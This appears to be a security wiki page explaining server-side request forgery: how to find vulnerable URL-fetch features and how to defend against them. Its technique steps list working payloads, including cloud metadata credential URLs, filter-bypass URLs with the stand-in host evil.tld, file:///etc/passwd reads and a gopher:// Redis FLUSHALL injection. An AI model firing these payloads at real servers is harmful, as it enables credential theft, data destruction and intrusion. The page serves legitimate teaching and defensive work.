---
title: Server-side request forgery (SSRF)
slug: ssrf
---

> **TL;DR:** Coerce the application server to issue HTTP/gRPC/Redis/file requests to a destination the attacker chose — pivot to internal services, cloud metadata, and chained RCE on internal dashboards.

## What it is
SSRF turns the application server into a confused-deputy HTTP client. Any feature where the server fetches a URL on the user's behalf — webhook senders, image proxies, PDF generators, OAuth discovery, SAML metadata fetch, link previews, server-side import — is a candidate. Impact ranges from internal port scan to full cloud account takeover via Instance Metadata Service (IMDS) credential theft.

## Preconditions / where it applies
- An app feature accepts a URL or a hostname (`?url=`, webhook config, `<img>` proxy, PDF/HTML-to-image render).
- The fetch is performed by the server with server-side network access (i.e. it can reach things the attacker cannot).
- Bonus: response body or error is reflected to the attacker. Even without reflection, blind SSRF (timing, DNS callback) is valuable.

## Technique

**Step 1 — find the sink.** Look for fields that look like URLs, file paths, or hostnames in:

- Webhook / callback URLs.
- File-upload-by-URL (`POST /upload?url=https://...`).
- HTML-to-PDF / wkhtmltopdf / Puppeteer renderers (often render with cookies / `--allow-file-access-from-files`).
- OAuth discovery URLs, SAML metadata URLs.
- Image proxies, avatar fetchers, link unfurlers.
- Server-side fetch in GraphQL `@requires` directives.

**Step 2 — hit cloud metadata.** Old IMDSv1 still common:

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token   # need Metadata-Flavor: Google
http://169.254.169.254/metadata/instance?api-version=2021-02-01                              # Azure, needs Metadata: true
http://100.100.100.200/latest/meta-data/                                                     # Alibaba
http://169.254.169.254/openstack/latest/meta_data.json                                       # OpenStack
```

See [[ssrf-to-cloud]] for the cloud-specific chain.

**Step 3 — bypass URL filters.** Allowlists usually check the hostname before resolving — break the equivalence:

```
http://127.1                       # short form
http://0.0.0.0
http://[::]
http://localhost@evil.tld
http://evil.tld@127.0.0.1
http://①②⑦.0.0.1                  # unicode digits
http://0x7f.0.0.1
http://2130706433                  # decimal IPv4
http://127.0.0.1:80#@evil.tld
http://evil.tld%23.target.com
```

DNS rebinding ([[dns-rebinding]]) defeats parse-time IP checks — the resolver returns `1.2.3.4` on the first lookup (allowlisted) and `169.254.169.254` on the second (server's fetch).

**Step 4 — protocol smuggling.** If the fetch library accepts unusual schemes:

```
file:///etc/passwd
gopher://127.0.0.1:6379/_FLUSHALL%0d%0aSET%20x%201
dict://127.0.0.1:11211/stats
ldap://internal-ad/o
```

`gopher://` is the classic for arbitrary-byte injection into Redis / memcached / SMTP (and historically Java URL handler).

**Step 5 — internal port scan & service-specific RCE.** Hit common internal admin panels (Jenkins `/script`, Spring `/actuator`, Apache Solr `/solr/admin/cores`, Kubernetes `/api/v1/`, Consul `/v1/agent/`, Elasticsearch `/_cluster/state`). Often these expose RCE-by-design when reachable.

## Detection and defence
- Use an allowlist of egress domains; resolve hostname → IP and reject RFC1918 / 100.64.x.x / 169.254.x.x / IPv6 ULA / fc00::/7.
- Resolve once and connect by IP (no second DNS lookup); set the HTTP `Host` header from the original hostname.
- Disable redirect following or re-validate after each redirect; reject schemes other than `http` and `https`.
- IMDSv2 on AWS (token-required); disable IMDS where possible.
- Egress firewalls / NetworkPolicies enforce L4 destination per workload.
- Logs: outbound to RFC1918 / link-local / metadata IPs from web tier.

See also [[ssrf-to-cloud]], [[dns-rebinding]], [[open-redirect]].

## References
- [PortSwigger – SSRF](https://portswigger.net/web-security/ssrf) — primer + labs
- [HackTricks – SSRF](https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/index.html) — bypass catalogue
- [HackingTheCloud – Metadata endpoints](https://hackingthe.cloud/aws/exploitation/ec2-metadata-ssrf/) — cloud-specific
